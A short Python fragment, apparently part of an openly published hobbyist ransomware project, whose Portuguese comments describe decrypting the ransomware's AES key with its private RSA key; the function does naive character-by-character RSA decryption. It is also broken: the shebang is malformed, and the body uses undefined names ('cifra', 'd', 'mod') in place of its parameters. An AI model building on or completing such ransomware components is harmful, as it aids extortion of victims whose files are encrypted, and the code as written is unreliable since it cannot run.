#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho

# DESCRIPTOGRAFA A CHAVE AES COM A CHAVE PRIVADA DO RANSOMWARE

def descifra(chave_criptografada,n):
    #PRECISA DO (D)
    # QUE TEM QUE SER DESCRIPTOGRAFADO PELA CHAVE PRIVADA DO SERVIDOR

    lista=[]
    i=0
    tamanho=len(cifra)
    # texto=cifra ^ d mod n
    while i<tamanho:
        cifra[i]=int(cifra[i])
        result=cifra[i]**d
        texto=mod(result,n)
        letra=chr(texto)
        lista.append(letra)
        i=i+1
    return lista
